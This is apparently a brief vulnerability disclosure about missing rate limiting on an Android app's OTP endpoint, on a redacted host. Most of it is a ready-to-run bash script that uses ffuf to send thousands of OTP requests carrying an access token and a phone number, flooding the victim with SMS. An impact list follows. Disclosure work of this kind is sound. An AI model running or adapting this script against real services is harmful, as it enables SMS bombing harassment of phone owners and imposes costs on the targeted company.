---
layout: default
---

# Android No Rate Limiting Leads to Mass SMS Brute-Force

Endpoint Requesting an otp but problem is there is no rate limiting. We can request unlimited otp's.

I crafted A `ffuf Request` to make it fast and easier

## Exploit.sh 

```
#! /bin/bash

seq 1  9999 | ffuf -u https://sub.redacted.com/api/v2/otp \
-H 'accessToken:9CaeE1dbeMDfUw...' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'User-Agent: okhttp/4.0.1 FUZZ' \
-replay-proxy http://localhost:8080 \
-d  'param1=value1&data=919030178910 -w -
```


# Impact 

1. Attacker can send mass sms to victim who uses the product.
2. Over-using of resources leads to more cost to the company.




[back](./)
